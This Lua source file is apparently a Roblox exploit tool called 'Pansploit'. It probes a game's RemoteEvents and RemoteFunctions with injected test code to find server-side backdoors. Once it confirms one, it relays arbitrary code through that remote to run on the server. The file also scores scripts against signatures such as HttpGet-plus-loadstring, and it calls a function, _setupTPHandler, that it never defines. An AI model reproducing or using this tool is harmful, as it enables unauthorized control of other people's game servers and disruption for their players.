local _p = {}
_p._a = false
_p._m = "CLIENT"
_p._bd = nil
_p._infected = nil
_p._pid = 0
_p._gid = 0
_p._testing = false -- LALOL: Prevent concurrent tests

-- LALOL's alphabet for code generation
local _alphabet = {}
for i = 65, 90 do table.insert(_alphabet, string.char(i)) end -- A-Z
for i = 97, 122 do table.insert(_alphabet, string.char(i)) end -- a-z

if not _G._pans_data then
    _G._pans_data = {
        bd = nil,
        infected = nil,
        pid = 0,
        gid = 0,
        mode = "CLIENT",
        injected = false,
        testedRemotes = {} -- LALOL: Cache tested remotes
    }
end
local _st = _G._pans_data

-- Toast notification
local function _toast(title, text, dur)
    dur = dur or 4
    local plr = game:GetService("Players").LocalPlayer
    if not plr then return end
    
    -- Remove old toasts
    pcall(function()
        for _, g in ipairs(game:GetService("CoreGui"):GetChildren()) do
            if g.Name:find("PanToast") then g:Destroy() end
        end
    end)
    
    local sg = Instance.new("ScreenGui")
    sg.Name = "PanToast_" .. tostring(math.random(1000,9999))
    sg.ResetOnSpawn = false
    pcall(function() sg.Parent = game:GetService("CoreGui") end)
    if not sg.Parent then sg.Parent = plr:WaitForChild("PlayerGui") end
    
    local fr = Instance.new("Frame")
    fr.Size = UDim2.new(0, 350, 0, 90)
    fr.Position = UDim2.new(1, 20, 1, -110)
    fr.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
    fr.BorderSizePixel = 0
    fr.Parent = sg
    
    Instance.new("UICorner", fr).CornerRadius = UDim.new(0, 10)
    
    -- Title
    local tl = Instance.new("TextLabel")
    tl.Size = UDim2.new(1, -20, 0, 25)
    tl.Position = UDim2.new(0, 15, 0, 8)
    tl.BackgroundTransparency = 1
    tl.Text = title
    tl.TextColor3 = _p._m == "BACKDOOR" and Color3.fromRGB(255, 80, 80) or Color3.fromRGB(0, 255, 100)
    tl.Font = Enum.Font.GothamBold
    tl.TextSize = 16
    tl.TextXAlignment = Enum.TextXAlignment.Left
    tl.Parent = fr
    
    -- Text
    local tx = Instance.new("TextLabel")
    tx.Size = UDim2.new(1, -20, 0, 50)
    tx.Position = UDim2.new(0, 15, 0, 35)
    tx.BackgroundTransparency = 1
    tx.Text = text
    tx.TextColor3 = Color3.fromRGB(255, 255, 255)
    tx.Font = Enum.Font.Gotham
    tx.TextSize = 12
    tx.TextWrapped = true
    tx.TextXAlignment = Enum.TextXAlignment.Left
    tx.Parent = fr
    
    -- Animation
    spawn(function()
        for i = 1, 12 do
            fr.Position = UDim2.new(1, 20 - (i * 30), 1, -110)
            wait(0.03)
        end
        wait(dur)
        for i = 1, 12 do
            fr.Position = UDim2.new(1, -340 + (i * 30), 1, -110)
            fr.BackgroundTransparency = i / 12
            wait(0.03)
        end
        sg:Destroy()
    end)
end

-- LALOL: Generate random name
local function _generateName(length)
    length = length or math.random(12, 30)
    local name = ""
    for i = 1, length do
        name = name .. _alphabet[math.random(1, #_alphabet)]
    end
    return name
end

-- LALOL: Fire remote with test code
local function _fireTest(remote, code)
    local testCode = "a=Instance.new('Model',workspace)a.Name='" .. code .. "'"
    
    if remote:IsA("RemoteEvent") then
        remote:FireServer(testCode)
    elseif remote:IsA("RemoteFunction") then
        spawn(function()
            pcall(function()
                remote:InvokeServer(testCode)
            end)
        end)
    end
end

-- Execute code
local function _exec(code, useInfected)
    if not code then return false, "No code" end
    
    if useInfected and _p._infected and _p._infected.Object then
        local s, r = pcall(function()
            local fn, err = loadstring(code)
            if fn then return fn() end
            error(err)
        end)
        return s, r
    end
    
    local s, r = pcall(function()
        local fn, err = loadstring(code)
        if fn then return fn() end
        error(err)
    end)
    return s, r
end

-- R6
function _p.R6()
    local plr = game:GetService("Players").LocalPlayer
    if not plr then return false end
    
    if _p._infected then
        return _exec([[
            local plr = game:GetService("Players").LocalPlayer
            if plr and plr.Character then
                local hum = plr.Character:FindFirstChildOfClass("Humanoid")
                if hum then hum:Destroy() wait(0.1)
                local nh = Instance.new("Humanoid")
                nh.Name = "Humanoid"
                nh.Parent = plr.Character end
            end
        ]], true)
    end
    
    local char = plr.Character
    if not char then return false end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hum then return false end
    hum:Destroy()
    wait(0.1)
    local nh = Instance.new("Humanoid")
    nh.Name = "Humanoid"
    nh.Parent = char
    return true
end

-- Respawn
function _p.Respawn()
    local plr = game:GetService("Players").LocalPlayer
    if not plr then return false end
    
    if _p._infected then
        return _exec([[
            local plr = game:GetService("Players").LocalPlayer
            if plr and plr.Character then plr.Character:BreakJoints() end
        ]], true)
    end
    
    local char = plr.Character
    if char then char:BreakJoints() end
    wait(0.5)
    return true
end

-- Mode functions
function _p.SwitchMode()
    _p._m = _p._m == "BACKDOOR" and "CLIENT" or "BACKDOOR"
    _st.mode = _p._m
    print("PANS_MODE_CHANGED:" .. _p._m)
    return _p._m
end

function _p.SetMode(mode)
    _p._m = mode
    _st.mode = mode
    print("PANS_MODE_SET:" .. mode)
    return _p._m
end

function _p.GetMode()
    return _p._m
end

-- MERGED: Signature-based + Execution-based detection
local function _analyzeScript(obj)
    local info = {
        Object = obj,
        Path = obj:GetFullName(),
        Name = obj.Name,
        Type = obj.ClassName,
        Score = 0,
        Reasons = {},
        InfectionType = "NONE",
        Tested = false -- LALOL: Whether execution test was performed
    }
    
    local src = ""
    pcall(function() src = obj.Source or "" end)
    
    if src ~= "" then
        local srcLower = src:lower()
        
        -- Pattern 1: RemoteEvent + OnServerEvent + loadstring
        if src:find("OnServerEvent") and src:find("Connect") and src:find("loadstring") then
            if src:find("function%s*%([^,]+,[^%)]+%)") then
                info.Score = info.Score + 100
                info.InfectionType = "REMOTE_LOADSTRING"
                table.insert(info.Reasons, "OnServerEvent+loadstring")
            end
        end
        
        -- Pattern 2: RemoteFunction + OnServerInvoke + loadstring
        if src:find("OnServerInvoke") and src:find("loadstring") then
            info.Score = info.Score + 90
            info.InfectionType = "REMOTEFUNC_LOADSTRING"
            table.insert(info.Reasons, "OnServerInvoke+loadstring")
        end
        
        -- Pattern 3: Instance.new("RemoteEvent")
        if src:find("Instance%.new%s*%(%s*[\"']RemoteEvent[\"']") then
            if src:find("ReplicatedStorage") then
                info.Score = info.Score + 40
                table.insert(info.Reasons, "Dynamic RemoteEvent")
            end
        end
        
        -- Pattern 4: require + HTTP
        if src:find("require%s*%(") and (src:find("HttpGet") or src:find("loadstring")) then
            info.Score = info.Score + 80
            info.InfectionType = "REQUIRE_INJECTION"
            table.insert(info.Reasons, "require+HTTP/loadstring")
        end
        
        -- Pattern 5: game:HttpGet + loadstring
        if src:find("game:HttpGet") and src:find("loadstring") then
            info.Score = info.Score + 85
            info.InfectionType = "HTTP_LOADSTRING"
            table.insert(info.Reasons, "game:HttpGet+loadstring")
        end
        
        -- Pattern 6: setfenv/getfenv
        if (src:find("setfenv") or src:find("getfenv")) and src:find("loadstring") then
            info.Score = info.Score + 70
            table.insert(info.Reasons, "Environment manipulation")
        end
        
        -- Pattern 7: FireServer with loadstring result
        if src:find("FireServer") and src:find("loadstring") then
            info.Score = info.Score + 75
            table.insert(info.Reasons, "FireServer+loadstring")
        end
        
        -- Pattern 8: Suspicious names
        local badNames = {"backdoor", "infect", "virus", "payload", "exploit", "hack", "inject"}
        for _, bad in ipairs(badNames) do
            if srcLower:find(bad) then
                info.Score = info.Score + 30
                table.insert(info.Reasons, "Suspicious name: " .. bad)
            end
        end
        
        -- Pattern 9: Obfuscation
        local nonPrintable = 0
        for i = 1, #src do
            local b = src:byte(i)
            if b < 32 and b ~= 9 and b ~= 10 and b ~= 13 then
                nonPrintable = nonPrintable + 1
            end
        end
        if nonPrintable > 50 or #src > 15000 then
            info.Score = info.Score + 25
            table.insert(info.Reasons, "Obfuscated")
        end
    end
    
    return info
end

-- MERGED: LALOL execution test + Payload signature scan
local function _detectBackdoors()
    local candidates = {}
    local testedCodes = {} -- LALOL: Track which codes we've sent
    
    -- Step 1: Gather all remotes (LALOL's method)
    local services = {
        game:GetService("ReplicatedStorage"),
        game:GetService("ReplicatedFirst"),
        game:GetService("StarterGui"),
        game:GetService("StarterPack"),
        game:GetService("StarterPlayer"),
        game:GetService("Workspace"),
        game:GetService("Players")
    }
    
    for _, svc in ipairs(services) do
        for _, obj in ipairs(svc:GetDescendants()) do
            if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
                -- Skip RobloxReplicatedStorage
                local fullName = obj:GetFullName()
                if fullName:find("RobloxReplicatedStorage") then continue end
                
                -- Skip known safe remotes
                if obj.Name:find("DefaultChatSystem") then continue end
                if obj:FindFirstChild("__FUNCTION") then continue end -- Adonis
                if obj.Parent and obj.Parent.Name == "HDAdminClient" then continue end
                
                -- LALOL: Skip if already tested this session
                if _st.testedRemotes[fullName] then continue end
                
                table.insert(candidates, obj)
            end
        end
    end
    
    -- Step 2: LALOL execution test on high-probability remotes
    -- First test remotes that match signature patterns
    local priorityRemotes = {}
    local otherRemotes = {}
    
    for _, remote in ipairs(candidates) do
        -- Check if parent has suspicious scripts
        local parent = remote.Parent
        local isPriority = false
        
        if parent then
            for _, s in ipairs(parent:GetDescendants()) do
                if s:IsA("Script") or s:IsA("LocalScript") then
                    local analysis = _analyzeScript(s)
                    if analysis.Score >= 50 then
                        isPriority = true
                        break
                    end
                end
            end
        end
        
        -- Also prioritize by name
        local n = remote.Name:lower()
        if n:find("backdoor") or n:find("admin") or n:find("remote") then
            isPriority = true
        end
        
        if isPriority then
            table.insert(priorityRemotes, remote)
        else
            table.insert(otherRemotes, remote)
        end
    end
    
    -- Step 3: LALOL test execution
    local testResults = {}
    local workspace = game:GetService("Workspace")
    
    -- Test priority remotes first
    for _, remote in ipairs(priorityRemotes) do
        if _p._testing then break end
        
        local code = _generateName(math.random(15, 25))
        testedCodes[code] = remote
        _st.testedRemotes[remote:GetFullName()] = true
        
        _fireTest(remote, code)
        
        -- Wait a tiny bit for server response
        wait(0.05)
    end
    
    -- Wait for all tests to potentially complete
    wait(0.5)
    
    -- Check which codes appeared in workspace (LALOL's verification)
    for code, remote in pairs(testedCodes) do
        if workspace:FindFirstChild(code) then
            -- LALOL CONFIRMED: This remote executes code!
            table.insert(testResults, {
                Object = remote,
                Path = remote:GetFullName(),
                Name = remote.Name,
                Type = remote.ClassName,
                Score = 100,
                Reasons = {"LALOL_execution_test"},
                InfectionType = "CONFIRMED_BACKDOOR",
                Tested = true,
                ExecutionTime = tick()
            })
            
            -- Clean up test model
            pcall(function() workspace[code]:Destroy() end)
        end
    end
    
    -- Step 4: If no execution tests confirmed, fall back to signature detection
    if #testResults == 0 then
        for _, svc in ipairs(services) do
            for _, obj in ipairs(svc:GetDescendants()) do
                if obj:IsA("Script") or obj:IsA("LocalScript") or obj:IsA("ModuleScript") then
                    local analysis = _analyzeScript(obj)
                    if analysis.Score >= 60 then
                        table.insert(testResults, analysis)
                    end
                end
                
                -- Also check remotes with suspicious attributes
                if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
                    local hasAttr = false
                    pcall(function()
                        if obj:GetAttribute("Backdoor") or obj:GetAttribute("Infected") then
                            hasAttr = true
                        end
                    end)
                    
                    if hasAttr then
                        table.insert(testResults, {
                            Object = obj,
                            Path = obj:GetFullName(),
                            Name = obj.Name,
                            Type = obj.ClassName,
                            Score = 95,
                            Reasons = {"marked_attribute"},
                            InfectionType = "MARKED_BACKDOOR",
                            Tested = false
                        })
                    end
                end
            end
        end
    end
    
    -- Sort by score
    table.sort(testResults, function(a, b) return a.Score > b.Score end)
    
    return testResults
end

-- Init
function _p.Init(pid, gid)
    _p._pid = pid or 0
    _p._gid = gid or 0
    _st.pid = _p._pid
    _st.gid = _p._gid
    
    print("PANS_SCAN_START:" .. pid .. ":" .. gid)
    
    local backdoors = _detectBackdoors()
    
    if #backdoors > 0 then
        local best = backdoors[1]
        _p._bd = best
        _st.bd = best
        
        if best.InfectionType == "CONFIRMED_BACKDOOR" then
            _p._m = "BACKDOOR"
            _st.mode = "BACKDOOR"
            _p._a = true
            _st.injected = true
            
            _toast("[Pansploit] LALOL CONFIRMED!", 
                "Backdoor: " .. best.Name .. "\nType: " .. best.Type, 6)
            
            print("PANS_BACKDOOR_CONFIRMED:" .. pid .. ":" .. gid .. ":" .. best.Path .. ":" .. best.Type)
        else
            _p._infected = best
            _st.infected = best
            _p._m = "BACKDOOR"
            _st.mode = "BACKDOOR"
            _p._a = true
            _st.injected = true
            
            _toast("[Pansploit] INFECTED SCRIPT", 
                "Path: " .. best.Name .. "\nScore: " .. best.Score, 5)
            
            print("PANS_INFECTED_FOUND:" .. pid .. ":" .. gid .. ":" .. best.Path .. ":" .. best.Type .. ":" .. best.InfectionType)
        end
        
        print("PANS_MODE:BACKDOOR")
        
        -- Monitor backdoor removal
        spawn(function()
            while _p._a and best.Object and best.Object.Parent do
                wait(1)
            end
            if _p._a then
                _p._a = false
                _st.injected = false
                print("PANS_DISCONNECT:BACKDOOR_REMOVED")
            end
        end)
        
        -- TP Handler - monitor player leaving
        _setupTPHandler()
        
        return true, best
    end
    
    _toast("[Pansploit]", "No backdoors found\nRunning in CLIENT mode", 3)
    print("PANS_NO_BACKDOOR:" .. pid .. ":" .. gid)
    print("PANS_MODE:CLIENT")
    
    return false, nil
end
    
-- Execute
function _p.Exec(code, useBackdoor)
    if not _p._a and _p._m ~= "CLIENT" then
        return false, "Not active"
    end
    
    -- Use backdoor remote if available and requested
    if useBackdoor and _p._bd and _p._bd.Object then
        local remote = _p._bd.Object
        
        if remote:IsA("RemoteEvent") then
            remote:FireServer(code)
            return true, "Fired via RemoteEvent"
        elseif remote:IsA("RemoteFunction") then
            spawn(function()
                pcall(function()
                    remote:InvokeServer(code)
                end)
            end)
            return true, "Invoked via RemoteFunction"
        end
    end
    
    -- Fall back to infected script execution
    if _p._infected then
        return _exec(code, true)
    end
    
    -- Normal execution
    return _exec(code, false)
end

function _p.ExecBackdoor(code)
    if not _p._bd then
        return false, "No confirmed backdoor"
    end
    return _p.Exec(code, true)
end

function _p.ExecInfected(code)
    if not _p._infected then
        return false, "No infected script"
    end
    return _exec(code, true)
end

-- Status
function _p.Status()
    return {
        Active = _p._a,
        Mode = _p._m,
        PID = _p._pid,
        GID = _p._gid,
        Backdoor = _p._bd and {
            Path = _p._bd.Path,
            Name = _p._bd.Name,
            Type = _p._bd.Type,
            Confirmed = _p._bd.Tested
        } or nil,
        Infected = _p._infected and {
            Path = _p._infected.Path,
            Name = _p._infected.Name,
            Type = _p._infected.Type,
            Score = _p._infected.Score
        } or nil,
        HasBackdoor = _p._bd ~= nil,
        HasInfected = _p._infected ~= nil
    }
end

_st.payload = _p
return _p
